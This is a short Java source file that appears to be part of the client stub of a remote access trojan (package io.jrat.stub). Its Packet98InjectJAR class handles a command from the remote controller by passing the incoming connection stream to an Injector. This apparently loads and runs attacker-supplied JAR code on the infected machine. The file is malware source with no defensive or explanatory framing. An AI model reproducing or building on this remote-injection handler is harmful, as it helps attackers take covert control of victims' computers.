package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Injector;

public class Packet98InjectJAR extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Injector i = new Injector();
		i.inject(Connection.dis);
	}

}
